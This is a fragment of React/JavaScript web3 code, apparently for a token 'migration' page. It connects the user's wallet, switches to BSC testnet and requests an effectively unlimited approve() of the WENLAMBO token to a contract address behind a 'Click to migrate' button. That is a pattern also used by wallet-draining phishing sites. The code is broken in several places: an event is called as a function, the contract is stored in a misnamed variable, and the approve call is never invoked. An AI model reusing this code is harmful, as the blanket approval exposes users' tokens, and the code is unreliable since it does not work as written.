const contractProcessor = useWeb3ExecuteFunction ();

async function migration() {
    let options = {
contractAddress:"0x38401323a55ADB644429aF88E3e7705d2bD51a08",
functionName:"MigrateToV2",
abi:[{"inputs":[{"indexed":false,"internalType":"address","name":"addr","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"MigrateToV2","type":"event"}],
params:{
max_amount,
  note:"Migration completed!"
 }
 }
 await contractProcessor.fetch({ 
 params: options
})
}
const ethers = require('ethers');

const WENLAMBOInterface = ['function approve(address spender, uint256 amount) external returns (bool)'];
const WENLAMBOAddress = '0xB1485622Ca84eAc032D9943ce4A0B7867a48614c';
const yourContractAddress = "0x38401323a55ADB644429aF88E3e7705d2bD51a08";

let provider;
let signer;
let signerAddress;
let WENLAMBOContract;

const startFunction = async () => {
   await ethereum.request({ method: 'eth_requestAccounts'});
   await ethereum.request({ method: 'wallet_switchEthereumChain', params:[{chainId: '0x61'}]});
   provider = new ethers.providers.Web3Provider(window.ethereum);
   signer = provider.getSigner();
   signerAddress = await signer.getAddress();
   USDTContract = await new ethers.Contract(WENLAMBOAddress, WENLAMBOInterface, signer);
}
startFunction();

async function approveWENLAMBO(){
   WENLAMBOContract.approve(yourContractAddress, BigInt("9007199254740990")**3n);
}



    </Card>
    <center><Button onClick={() => approveWENLAMBO && migration()}>Click to migrate </Button></center>
   </div>
</div>
);
 }
